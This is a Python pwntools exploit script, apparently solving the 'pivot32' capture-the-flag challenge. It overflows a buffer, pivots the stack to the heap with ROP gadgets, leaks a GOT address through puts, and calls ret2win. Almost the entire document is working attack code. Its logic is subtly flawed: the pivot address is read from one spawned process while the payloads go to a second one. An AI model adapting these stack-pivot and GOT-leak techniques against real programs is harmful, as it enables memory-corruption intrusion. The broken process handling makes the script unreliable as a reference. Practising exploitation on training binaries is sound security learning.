from pwn import *

#trying to "pivot"(i.r move around esp) so that a longer stack chain can
#this solution is somewhat confusing and non intuitive

exe = context.binary = ELF("pivot32",checksec=False)
context.log_level = 'info'

offset = 44
foothold_plt = exe.plt[b'foothold_function']
foothold_got = exe.got[b'foothold_function']
puts_plt = exe.plt['puts']

p = process()
p.recvuntil("pivot: ")
pivot_addr = int(p.recvuntil('\n').strip(),16)
print("Pivot addr collected" + str(pivot_addr))

foothold_offset = 0x77d
ret2win_offset = 0x974
# theoretically - any function from libc can be called
#or a libc "one gadget" could be used


#stack pivoting gadgets 
pop_eax = 0x0804882c  
xchg_eax_esp = 0x0804882e

heap_payload = flat(
    foothold_plt,
    puts_plt,
    exe.symbols.main,
    foothold_got
)
p = process()
p.clean()
p.sendline(heap_payload)

#creating a "fake" stack by moving rsp to the heap
stack_smash = flat(
    asm('nop') * offset,
    pop_eax,
    pivot_addr,
    xchg_eax_esp
)

p.sendlineafter('>', stack_smash)
p.recvlines(2)
leaked_got_addr = p.recv()
foothold_leaked = unpack(leaked_got_addr[:4].strip())

library_basr_addr = foothold_leaked - foothold_offset
ret2win_addr = library_basr_addr + ret2win_offset

print(hex(ret2win_addr))
#gdb.attach - something very useful!

flag_payload = flat(
    asm('nop') * offset,
    ret2win_addr
)

p.sendline(flag_payload)
p.interactive()


